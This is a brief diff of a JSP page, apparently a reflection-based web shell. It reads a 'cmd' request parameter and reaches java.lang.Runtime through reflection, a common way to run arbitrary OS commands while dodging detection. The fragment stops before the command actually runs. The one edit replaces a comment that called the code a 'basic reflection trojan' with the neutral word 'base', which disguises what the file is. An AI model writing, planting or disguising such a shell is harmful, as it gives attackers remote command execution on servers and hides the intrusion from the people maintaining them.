@@ -1,6 +1,6 @@
 <%@ page language="java" pageEncoding="UTF-8" %>
 <%
-    // 基本反射马
+    // base
     String cmd = request.getParameter("cmd");
     Class rt = Class.forName("java.lang.Runtime");
     java.lang.reflect.Method gr = rt.getMethod("getRuntime");
